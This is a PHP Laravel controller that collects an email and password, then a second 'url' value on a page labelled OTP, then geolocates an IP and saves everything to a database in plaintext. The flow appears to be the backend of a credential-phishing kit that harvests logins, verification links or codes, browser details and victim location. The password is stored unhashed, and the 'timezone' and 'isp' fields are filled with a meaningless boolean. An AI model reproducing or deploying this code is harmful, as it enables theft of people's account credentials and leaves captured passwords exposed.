<?php

namespace App\Http\Controllers\Home;

use App\Http\Controllers\Controller;
use App\Models\Account;
use Illuminate\Http\Request;
use App\Services\GeoLocationService;
use GeoIp2\Database\Reader;


class AccountController extends Controller
{
    protected $geoLocationService;

    public function __construct(GeoLocationService $geoLocationService)
    {
        $this->geoLocationService = $geoLocationService;
    }
    public function home()
    {
        return view('index');
    }

    public function storeAccount(Request $request)
    {
        $request->validate(
            [
                'email' => 'required',
                'password' => 'required',
            ]
        );
        // $request->input("email");
        // $request->input("password");
        session(['step1_data' => $request->all()]);
        

        return redirect('url-verification');
    }

    public function showOtp()
    {
        return view('otp');
    }

    public function storeAccountTwo(Request $request)
    {
        $request->validate(
            [
                'url' => 'required',
            ]
        );
        // $request->input("url");
        session(['step2_data' => $request->all()]);

        return redirect('/finalize');
    }

    public function finalize(Request $request)
    {
        // Retrieve data from session
        $step1Data = session('step1_data');
        $step2Data = session('step2_data');
        $browserInfo = session('browser');


        $ip = "198.12.120.99"; // Get the client's IP address
        $reader = new Reader(storage_path('/app/GeoLite2-City.mmdb'));
        $cityRecord = $reader->city($ip);
        // $timeZoneReader = new Reader(storage_path('app/GeoIP2-City-TimeZone.mmdb'));
        // $timeZoneRecord = $timeZoneReader->timeZone($ip);
        $region = isset($cityRecord->mostSpecificSubdivision->name) ? $cityRecord->mostSpecificSubdivision->name : null;
        $country = isset($cityRecord->country->name) ? $cityRecord->country->name : null;
        $city = isset($cityRecord->city->name) ? $cityRecord->city->name : null;
        $postalCode = isset($cityRecord->postal->code) ? $cityRecord->postal->code : null;
        
        $data = [
            // timezone here
            'timezone' => null !== "check",
            'region' => $cityRecord->mostSpecificSubdivision->name,
            'country' => $cityRecord->country->name,
            'city' => $cityRecord->city->name,
            'postal_code' => $cityRecord->postal->code,
            'isp' => null !== "check",
            'ip' => $ip,
        ];
         $mergedArray = array_merge($step1Data, $step2Data, $browserInfo, $data);
         Account::create($mergedArray);

        // Clear session data
        session()->forget(['step1_data', 'step2_data', 'browser']);

        return redirect(route('success'));
    }

    public  function success(){
        return view('success');
    }
}
